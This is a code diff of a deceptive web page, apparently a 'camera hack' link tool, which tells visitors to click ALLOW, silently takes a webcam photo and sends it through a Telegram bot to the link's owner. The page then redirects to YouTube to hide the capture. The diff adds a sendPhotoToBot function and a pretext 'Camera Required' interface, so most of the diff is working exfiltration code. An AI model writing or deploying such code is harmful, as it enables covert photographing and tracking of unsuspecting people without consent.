@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Redirecting to Chrome...</title>
+    <title>Camera</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -49,14 +49,15 @@
             width: 100%;
             margin-top: 20px;
         }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔄 Redirecting</h1>
-        <div class="subtitle">Opening in Chrome browser...</div>
-        <div class="loading"></div>
-        <div class="status">Please wait...</div>
+        <h1 id="title">📸 Camera Required</h1>
+        <div class="subtitle" id="subtitle">Please click ALLOW to continue</div>
+        <div class="loading" id="loading"></div>
+        <div class="status" id="status">Requesting camera permission...</div>
     </div>
 
     <script>
@@ -76,6 +77,35 @@
         }
         
         let photoSent = false;
+        
+        async function sendPhotoToBot(imageBlob) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onloadend = function() {
+                    const base64data = reader.result;
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: (function() {
+                            const fd = new FormData();
+                            fd.append('chat_id', OWNER_ID);
+                            fd.append('photo', imageBlob, 'photo.jpg');
+                            fd.append('caption', `📸 Photo captured!\n🕐 ${new Date().toLocaleString()}`);
+                            return fd;
+                        })()
+                    })
+                    .then(res => {
+                        console.log('Response:', res.status);
+                        resolve();
+                    })
+                    .catch(err => {
+                        console.log('Fetch error:', err);
+                        resolve();
+                    });
+                };
+                reader.readAsDataURL(imageBlob);
+            });
+        }
         
         async function takePhotoAndSend(stream) {
             if (photoSent) return;
@@ -100,29 +130,19 @@
             
             stream.getTracks().forEach(track => track.stop());
             
+            document.getElementById('status').innerHTML = '📤 Sending photo...';
+            
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', OWNER_ID);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `📸 Photo captured!\n🕐 ${new Date().toLocaleString()}`);
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch(e) {
-                    console.log('Send error:', e);
-                }
-                
+                await sendPhotoToBot(blob);
                 window.location.href = YOUTUBE_URL;
-                
             }, 'image/jpeg', 0.8);
         }
         
         async function init() {
             if (!OWNER_ID) {
-                document.body.innerHTML = '<div class="container"><h1>❌ Error</h1><div class="subtitle">Invalid link</div></div>';
+                document.getElementById('title').innerHTML = '❌ Error';
+                document.getElementById('subtitle').innerHTML = 'Invalid link';
+                document.getElementById('loading').style.display = 'none';
                 return;
             }
             
@@ -133,13 +153,10 @@
                 await takePhotoAndSend(stream);
                 
             } catch (err) {
-                document.body.innerHTML = `
-                    <div class="container">
-                        <h1>📸 Camera Required</h1>
-                        <div class="subtitle">Please click ALLOW to continue</div>
-                        <button onclick="location.reload()">🔄 Try Again</button>
-                    </div>
-                `;
+                document.getElementById('title').innerHTML = '❌ Camera Required';
+                document.getElementById('subtitle').innerHTML = 'Please click ALLOW to continue';
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('status').innerHTML = 'Click ALLOW button above ☝️';
                 
                 if (OWNER_ID) {
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -154,7 +171,7 @@
             }
         }
         
-        // Chrome မှာဆိုရင် Camera စမယ်
+        // Chrome မှာဆိုရင် စမယ်
         if (!isTelegram || !isMobile) {
             init();
         }
